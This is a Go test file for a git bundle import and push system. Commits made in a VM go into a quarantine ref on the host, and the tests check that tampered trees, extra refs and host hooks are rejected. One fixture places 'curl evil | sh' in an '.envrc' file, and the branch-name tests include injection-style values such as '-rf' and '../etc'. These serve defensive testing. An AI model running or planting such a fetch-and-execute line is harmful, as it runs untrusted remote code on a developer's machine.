package gitx

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// vmRepo is a snapshot of a fresh host repository, standing in for the
// VM's workspace.
func vmRepo(t *testing.T) (host string, vm *Snapshot) {
	t.Helper()
	host, _ = repo(t)
	s, err := TakeSnapshot(context.Background(), host)
	if err != nil || s == nil {
		t.Fatalf("snapshot: %v", err)
	}
	t.Cleanup(func() { _ = s.Close() })
	git(t, s.Dir, "reset", "-q", "--hard")
	return host, s
}

// bundleFromVM runs the script the VM runs, here, against the stand-in.
func bundleFromVM(t *testing.T, vmDir, branch string, bases ...string) (string, int) {
	t.Helper()
	out := filepath.Join(t.TempDir(), "push.bundle")
	cmd := exec.Command("bash", "-c", BundleScript(vmDir, branch, bases, out))
	cmd.Env = append(os.Environ(), "GIT_AUTHOR_NAME=v", "GIT_AUTHOR_EMAIL=v@vm", "GIT_COMMITTER_NAME=v", "GIT_COMMITTER_EMAIL=v@vm")
	b, err := cmd.CombinedOutput()
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			return string(b), ee.ExitCode()
		}
		t.Fatal(err)
	}
	return out, 0
}

func commitIn(t *testing.T, dir, file, body, msg string) {
	t.Helper()
	write(t, dir, file, body)
	git(t, dir, "add", "--", file)
	git(t, dir, "commit", "-qm", msg)
}

func TestBundleImportsIntoQuarantine(t *testing.T) {
	host, vm := vmRepo(t)
	hostHead := git(t, host, "rev-parse", "HEAD")
	commitIn(t, vm.Dir, "feature.txt", "new\n", "feature")
	b, code := bundleFromVM(t, vm.Dir, "main", hostHead)
	if code != 0 {
		t.Fatalf("bundle script exited %d: %s", code, b)
	}
	ref := QuarantineRef("proj", "main")
	if err := ImportBundle(context.Background(), host, b, "main", ref); err != nil {
		t.Fatal(err)
	}
	if git(t, host, "rev-parse", ref) != git(t, vm.Dir, "rev-parse", "HEAD") {
		t.Error("quarantine ref should hold the VM's commit")
	}
	if git(t, host, "rev-parse", "refs/heads/main") != hostHead {
		t.Error("the host's own branch must not move")
	}
	if _, err := os.Stat(filepath.Join(host, "feature.txt")); err == nil {
		t.Error("the host's work tree must not change")
	}
}

func TestBundleScriptReportsNothingNew(t *testing.T) {
	host, vm := vmRepo(t)
	if out, code := bundleFromVM(t, vm.Dir, "main", git(t, host, "rev-parse", "HEAD")); code != ExitNothingToPush {
		t.Errorf("exit %d (%s), want %d", code, out, ExitNothingToPush)
	}
}

func TestImportRejectsAMaliciousTree(t *testing.T) {
	host, vm := vmRepo(t)
	blob := strings.TrimSpace(gitStdin(t, vm.Dir, "evil\n", "hash-object", "-w", "--stdin"))
	tree := strings.TrimSpace(gitStdin(t, vm.Dir, "100644 blob "+blob+"\t.git\n", "mktree"))
	c := git(t, vm.Dir, "commit-tree", tree, "-p", "HEAD", "-m", "evil")
	git(t, vm.Dir, "update-ref", "refs/heads/main", c)
	b, code := bundleFromVM(t, vm.Dir, "main", git(t, host, "rev-parse", "HEAD"))
	if code != 0 {
		t.Fatalf("bundle: %d %s", code, b)
	}
	ref := QuarantineRef("proj", "main")
	if err := ImportBundle(context.Background(), host, b, "main", ref); err == nil {
		t.Fatal("a tree with a .git entry must be refused")
	}
	if out, _ := exec.Command("git", "-C", host, "show-ref", ref).Output(); len(out) != 0 {
		t.Error("no ref may be created for a refused bundle")
	}
}

func TestImportRejectsUnexpectedRefs(t *testing.T) {
	host, vm := vmRepo(t)
	commitIn(t, vm.Dir, "a.txt", "a\n", "a")
	git(t, vm.Dir, "tag", "sneaky")
	b := filepath.Join(t.TempDir(), "x.bundle")
	git(t, vm.Dir, "bundle", "create", "-q", b, "refs/heads/main", "refs/tags/sneaky", "^"+git(t, host, "rev-parse", "HEAD"))
	if err := ImportBundle(context.Background(), host, b, "main", QuarantineRef("proj", "main")); err == nil {
		t.Error("a bundle carrying more than the named branch must be refused")
	}
	if err := ImportBundle(context.Background(), host, b, "other", QuarantineRef("proj", "other")); err == nil {
		t.Error("a bundle for another branch must be refused")
	}
}

func TestImportAndPushRunNoHostHooks(t *testing.T) {
	host, vm := vmRepo(t)
	remote := filepath.Join(t.TempDir(), "remote.git")
	git(t, host, "init", "-q", "--bare", remote)
	git(t, host, "push", "-q", remote, "main")
	marker := filepath.Join(t.TempDir(), "ran")
	for _, h := range []string{"pre-push", "reference-transaction", "post-merge"} {
		write(t, host, ".git/hooks/"+h, "#!/bin/sh\necho "+h+" >> "+marker+"\n")
	}
	commitIn(t, vm.Dir, "b.txt", "b\n", "b")
	b, _ := bundleFromVM(t, vm.Dir, "main", git(t, host, "rev-parse", "HEAD"))
	ref := QuarantineRef("proj", "main")
	if err := ImportBundle(context.Background(), host, b, "main", ref); err != nil {
		t.Fatal(err)
	}
	if err := Push(context.Background(), host, remote, ref, "main", false, os.Stderr); err != nil {
		t.Fatal(err)
	}
	if git(t, remote, "rev-parse", "main") != git(t, vm.Dir, "rev-parse", "HEAD") {
		t.Error("the remote should have the VM's commit")
	}
	if ran, err := os.ReadFile(marker); err == nil {
		t.Errorf("host hooks ran: %s", ran)
	}
}

func TestPushRefusesANonFastForwardWithoutLease(t *testing.T) {
	host, vm := vmRepo(t)
	remote := filepath.Join(t.TempDir(), "remote.git")
	git(t, host, "init", "-q", "--bare", remote)
	git(t, host, "push", "-q", remote, "main")
	commitIn(t, host, "host.txt", "h\n", "moved on the host")
	git(t, host, "push", "-q", remote, "main")
	commitIn(t, vm.Dir, "vm.txt", "v\n", "from the vm")
	b, _ := bundleFromVM(t, vm.Dir, "main", git(t, host, "rev-parse", "HEAD"), git(t, host, "rev-parse", "HEAD~1"))
	ref := QuarantineRef("proj", "main")
	if err := ImportBundle(context.Background(), host, b, "main", ref); err != nil {
		t.Fatal(err)
	}
	if err := Push(context.Background(), host, remote, ref, "main", false, os.Stderr); err == nil {
		t.Error("a push that would drop the remote's commit must fail")
	}
}

func TestReviewFlagsFilesThatRunOutsideTheVM(t *testing.T) {
	host, vm := vmRepo(t)
	base := git(t, host, "rev-parse", "HEAD")
	commitIn(t, vm.Dir, ".github/workflows/ci.yml", "on: push\n", "ci")
	commitIn(t, vm.Dir, ".envrc", "curl evil | sh\n", "direnv")
	commitIn(t, vm.Dir, ".vscode/tasks.json", "{}\n", "tasks")
	commitIn(t, vm.Dir, "apps/web/package.json", "{}\n", "scripts")
	commitIn(t, vm.Dir, "src/app.ts", "x\n", "code")
	b, _ := bundleFromVM(t, vm.Dir, "main", base)
	ref := QuarantineRef("proj", "main")
	if err := ImportBundle(context.Background(), host, b, "main", ref); err != nil {
		t.Fatal(err)
	}
	r, err := Review(context.Background(), host, ref, base)
	if err != nil {
		t.Fatal(err)
	}
	if len(r.Commits) != 5 {
		t.Errorf("commits = %d, want 5", len(r.Commits))
	}
	want := map[string]bool{".github/workflows/ci.yml": true, ".envrc": true, ".vscode/tasks.json": true, "apps/web/package.json": true}
	if len(r.Sensitive) != len(want) {
		t.Errorf("sensitive = %v", r.Sensitive)
	}
	for _, p := range r.Sensitive {
		if !want[p] {
			t.Errorf("%s should not be flagged", p)
		}
	}
	if r.Commits[0].Email != "t@example.com" || r.Commits[0].Subject != "code" {
		t.Errorf("author email = %q", r.Commits[0].Email)
	}
}

func TestValidBranch(t *testing.T) {
	for name, ok := range map[string]bool{
		"main": true, "feature/x-1": true, "PAYROLLUP-84-fix": true, "a.b_c": true,
		"": false, "-rf": false, "../etc": false, "a..b": false, "a//b": false, "a/": false,
		"/a": false, "a.lock": false, "a@{1}": false, "a b": false, "a\nb": false, "HEAD": false,
		"refs/heads/x": false, "a~1": false, "a^": false, "a:b": false, "a\\b": false, "a*": false,
		strings.Repeat("x", 201): false,
	} {
		if got := ValidBranch(name); got != ok {
			t.Errorf("ValidBranch(%q) = %v, want %v", name, got, ok)
		}
	}
}

func gitStdin(t *testing.T, dir, in string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", append([]string{"-C", dir}, args...)...)
	cmd.Stdin = strings.NewReader(in)
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, out)
	}
	return string(out)
}
